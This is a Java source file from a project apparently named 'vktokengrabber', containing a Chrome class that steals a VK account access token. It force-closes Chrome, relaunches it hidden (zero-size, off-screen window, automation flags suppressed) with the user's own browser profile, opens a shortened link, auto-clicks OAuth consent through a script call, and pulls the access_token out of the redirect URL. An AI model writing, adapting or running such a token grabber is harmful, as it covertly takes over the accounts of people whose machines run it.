package com.github.dedinc.vktokengrabber.browsers;

import java.io.File;
import java.util.Arrays;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;

import com.github.dedinc.vktokengrabber.utils.WebDriver;

public class Chrome {
	public static String grabToken() {
		String username = System.getenv("USERNAME");
		if (!new File("C:\\Users\\" + username + "\\chromedriver.exe").exists()) {
			WebDriver.getChromeDriver();
		}
		String chrome = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome";
		System.setProperty("webdriver.chrome.driver", "C:\\Users\\" + username + "\\chromedriver.exe");
		try {
			Runtime.getRuntime().exec("taskkill /im chrome.exe /f");
		} catch (Exception e) {
		}
		ChromeOptions options = new ChromeOptions();
		options.addArguments("user-data-dir=" + chrome + "\\User Data");
		options.addArguments("--disable-gpu");
		options.addArguments("--window-size=0,0");
	    options.addArguments("--window-position=-99999,99999");
		options.setExperimentalOption("excludeSwitches", Arrays.asList("enable-automation"));
		options.setExperimentalOption("useAutomationExtension", false);
		ChromeDriver driver = new ChromeDriver(options);
		driver.get("https://vk.cc/9Y1vwX");
		JavascriptExecutor js = (JavascriptExecutor) driver;  
		if (driver instanceof JavascriptExecutor) {
			js.executeScript("allow()");
		}
		String url = driver.getCurrentUrl();		
		driver.quit();
		try {
			return "Token: " + url.split("access_token=")[1].split("&")[0];
		   } catch (Exception e ) {
		}
		return null;
	}
}
